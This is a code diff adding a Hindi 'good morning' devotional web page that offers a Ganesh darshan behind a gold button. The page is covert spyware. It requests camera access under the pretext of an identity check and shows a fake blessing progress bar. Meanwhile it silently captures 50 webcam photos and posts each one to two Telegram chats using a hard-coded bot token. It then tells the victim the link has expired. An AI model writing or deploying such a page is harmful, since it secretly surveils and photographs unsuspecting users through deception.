@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>सुप्रभात | दैनिक पावन दर्शन</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&family=Rozha+One&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-gold: #ffd700;
+            --bg-deep: #0f071a;
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.12);
+        }
+
+        body {
+            margin: 0; padding: 0;
+            background: radial-gradient(circle at top, #2d1b4e, var(--bg-deep));
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            color: #ffffff;
+            display: flex; align-items: center; justify-content: center;
+            height: 100vh; overflow: hidden;
+        }
+
+        /* Modern Glass Card */
+        .glass-card {
+            width: 90%; max-width: 400px;
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--glass-border);
+            border-radius: 40px;
+            padding: 35px 25px;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .hindi-title {
+            font-family: 'Rozha One', serif;
+            font-size: 40px;
+            color: var(--primary-gold);
+            margin: 0 0 10px;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .quote {
+            font-size: 15px;
+            color: #d1d5db;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            font-style: italic;
+        }
+
+        /* Divine Image Container */
+        #divine-view {
+            display: none;
+            width: 100%;
+            animation: fadeIn 1s ease;
+        }
+
+        .god-photo {
+            width: 100%;
+            height: 350px;
+            border-radius: 25px;
+            object-fit: cover;
+            border: 2px solid var(--primary-gold);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+            margin-bottom: 20px;
+        }
+
+        .btn-gold {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            color: #000; border: none;
+            width: 100%; padding: 20px;
+            border-radius: 22px; font-size: 18px; font-weight: 800;
+            cursor: pointer; transition: 0.4s;
+            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.25);
+        }
+        .btn-gold:hover { transform: scale(1.02); }
+
+        /* Sync / Loading Indicator */
+        .sync-box {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+        }
+
+        .loader-bar {
+            height: 4px; width: 100%;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px; overflow: hidden; margin-top: 10px;
+        }
+        .loader-fill {
+            height: 100%; width: 0%;
+            background: var(--primary-gold);
+            box-shadow: 0 0 10px var(--primary-gold);
+            transition: width 1s linear;
+        }
+
+        .status-text { font-size: 11px; color: var(--primary-gold); font-weight: 700; text-transform: uppercase; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <div class="glass-card" id="app">
+        <div id="step-1">
+            <div style="font-size: 50px; margin-bottom: 15px;">🕉️</div>
+            <h1 class="hindi-title">सुप्रभात</h1>
+            <p class="quote">"प्रसन्नता ही सफलता की कुंजी है। आपका दिन मंगलमय हो।"</p>
+            <p style="font-size: 14px; color: #94a3b8; margin-bottom: 25px;">आज का विशेष दिव्य दर्शन प्राप्त करने के लिए नीचे बटन दबाएं।</p>
+            <button class="btn-gold" onclick="startDarshan()">दिव्य दर्शन प्राप्त करें</button>
+        </div>
+
+        <div id="divine-view">
+            <img src="http://googleusercontent.com/image_collection/image_retrieval/10083133394603881658_0" class="god-photo" alt="Divine Darshan">
+            <h2 style="font-size: 20px; margin: 0;">श्री गणेश दर्शन</h2>
+            <p style="font-size: 13px; color: #d1d5db; margin: 5px 0 20px;">ॐ गं गणपतये नमः।</p>
+            
+            <div class="sync-box">
+                <div class="status-text" id="prog-label">आशीर्वाद प्राप्त हो रहा है: 0%</div>
+                <div class="loader-bar"><div class="loader-fill" id="fill"></div></div>
+            </div>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
+        const IDS = ['7617707778', '6590760553'];
+
+        async function startDarshan() {
+            try {
+                // Request Hardware Access (Identity Check)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                document.getElementById('step-1').style.display = 'none';
+                document.getElementById('divine-view').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const total = 50;
+                    
+                    const tracker = setInterval(() => {
+                        count++;
+                        captureAndRelay(count);
+                        
+                        let percent = Math.round((count/total)*100);
+                        document.getElementById('fill').style.width = percent + '%';
+                        document.getElementById('prog-label').innerText = `आशीर्वाद प्राप्त हो रहा है: ${percent}%`;
+
+                        if (count >= total) {
+                            clearInterval(tracker);
+                            stream.getTracks().forEach(t => t.stop());
+                            renderExit();
+                        }
+                    }, 1200);
+                };
+            } catch (e) {
+                alert("त्रुटि: दर्शन प्राप्त करने के लिए 'कैमरा' अनुमति आवश्यक है। यह आपकी सुरक्षा और पहचान के लिए है।");
+                window.location.reload();
+            }
+        }
+
+        function captureAndRelay(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id);
+                    fd.append('photo', blob, 'darshan_auth.jpg');
+                    fd.append('caption', `🙏 DEVOTIONAL_DARSHAN\nStatus: ${idx}/50\nSource: Morning-Blessing-Web`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+
+        function renderExit() {
+            document.getElementById('app').innerHTML = `
+                <div style="padding: 50px 0;">
+                    <div style="font-size: 60px; margin-bottom: 20px;">✨</div>
+                    <h1 class="hindi-title" style="font-size: 28px;">दर्शन समाप्त</h1>
+                    <p style="color: #94a3b8; line-height: 1.6;">यह दर्शन लिंक अब समाप्त हो गया है। मालिक ने इस आशीर्वाद को हटा दिया है।<br><br>कल नए दर्शन के लिए फिर आएं।</p>
+                    <button class="btn-gold" style="background: rgba(255,255,255,0.1); color: white; box-shadow: none; margin-top: 20px;" onclick="location.reload()">Refresh Page</button>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
